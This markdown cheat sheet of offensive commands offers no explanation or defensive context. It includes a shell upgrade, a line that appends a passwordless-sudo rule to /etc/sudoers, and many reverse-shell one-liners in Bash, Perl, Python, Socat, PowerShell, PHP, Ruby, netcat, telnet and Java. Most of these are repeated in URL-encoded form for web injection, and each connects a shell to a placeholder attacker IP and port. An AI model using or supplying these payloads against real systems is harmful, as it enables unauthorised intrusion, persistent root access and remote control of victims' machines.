# usu_command


## 完整shell
python -c "import pty;pty.spawn('/bin/bash')"


## 加入到sudoer
echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

## Reverse shell
### Bash
```
Common:
bash -i >& /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1
0<&196;exec 196<>/dev/tcp/<IP_ADDRESS>/<PORT>; sh <&196 >&196 2>&196
sh -i >& /dev/udp/<IP_ADDRESS>/<PORT> 0>&1
URL Encode:
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP_ADDRESS>%2F<PORT>%200%3E%261
0%3C%26196%3Bexec%20196%3C%3E%2Fdev%2Ftcp%2F<IP_ADDRESS>%2F<PORT>%3B%20sh%20%3C%26196%20%3E%26196%202%3E%26196
sh%20-i%20%3E%26%20%2Fdev%2Fudp%2F<IP_ADDRESS>%2F<PORT>%200%3E%261
```
### Perl
```
perl -e 'use Socket;$i="<IP_ADDRESS>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
For windows only:
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
URL Encode:
perl%20-e%20'use%20Socket%3B%24i%3D%22<IP_ADDRESS>%22%3B%24p%3D<PORT>%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B'
perl%20-MIO%20-e%20'%24p%3Dfork%3Bexit%2Cif(%24p)%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET(PeerAddr%2C%22<IP_ADDRESS>%3A<PORT>%22)%3BSTDIN-%3Efdopen(%24c%2Cr)%3B%24~-%3Efdopen(%24c%2Cw)%3Bsystem%24_%20while%3C%3E%3B'
For windows only:
perl%20-MIO%20-e%20'%24p%3Dfork%3Bexit%2Cif(%24p)%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET(PeerAddr%2C%22<IP_ADDRESS>%3A<PORT>%22)%3BSTDIN-%3Efdopen(%24c%2Cr)%3B%24~-%3Efdopen(%24c%2Cw)%3Bsystem%24_%20while%3C%3E%3B'
```
### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ADDRESS>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
URL Encode:
python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22<IP_ADDRESS>%22%2C<PORT>))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B'
```
### Socat
```
socat tcp-connect:<IP_ADDRESS>:<PORT> exec:bash -li,pty,stderr,setsid,sigint,sane
URL Encode:
socat%20tcp-connect%3A<IP_ADDRESS>%3A<PORT>%20exec%3Abash%20-li%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane
```
### PowerShell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP_ADDRESS>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP_ADDRESS>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
URL Encode:
powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20-Command%20New-Object%20System.Net.Sockets.TCPClient(%22<IP_ADDRESS>%22%2C<PORT>)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%20%3D%20%24sendback%20%2B%20%22PS%20%22%20%2B%20(pwd).Path%20%2B%20%22%3E%20%22%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()
powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient('<IP_ADDRESS>'%2C<PORT>)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20'PS%20'%20%2B%20(pwd).Path%20%2B%20'%3E%20'%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22
```
### PHP
```
php -r '$sock=fsockopen("<IP_ADDRESS>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
URL Encode:
php%20-r%20'%24sock%3Dfsockopen(%22<IP_ADDRESS>%22%2C<PORT>)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B'
```
### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("<IP_ADDRESS>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
URL Encode:
ruby%20-rsocket%20-e'f%3DTCPSocket.open(%22<IP_ADDRESS>%22%2C<PORT>).to_i%3Bexec%20sprintf(%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf)'
```

### Netcat(nc)
```
nc -e /bin/sh <IP_ADDRESS> <PORT>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ADDRESS> <PORT> >/tmp/f
rm -f x; mknod x p && nc <IP_ADDRESS> <PORT> 0<x | /bin/bash 1>x
URL Encode:
nc%20-e%20%2Fbin%2Fsh%20<IP_ADDRESS>%20<PORT>
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<IP_ADDRESS>%20<PORT>%20%3E%2Ftmp%2Ff
rm%20-f%20x%3B%20mknod%20x%20p%20%26%26%20nc%20<IP_ADDRESS>%20<PORT>%200%3Cx%20%7C%20%2Fbin%2Fbash%201%3Ex
```

### FREEBSD
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <IP_ADDRESS> <PORT> > /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet <IP_ADDRESS> <PORT> > /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc <IP_ADDRESS> <PORT> > /tmp/f
URL Encode:
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Ctelnet%20<IP_ADDRESS>%20<PORT>%20%3E%20%2Ftmp%2Ff
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%20%7Ctelnet%20<IP_ADDRESS>%20<PORT>%20%3E%20%2Ftmp%2Ff
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%20%7Cnc%20<IP_ADDRESS>%20<PORT>%20%3E%20%2Ftmp%2Ff
```
### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP_ADDRESS>/<PORT>;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()
URL Encode:
r%20%3D%20Runtime.getRuntime()%0Ap%20%3D%20r.exec(%5B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%22exec%205%3C%3E%2Fdev%2Ftcp%2F<IP_ADDRESS>%2F<PORT>%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%5C%5C%24line%202%3E%265%20%3E%265%3B%20done%22%5D%20as%20String%5B%5D)%0Ap.waitFor()
```



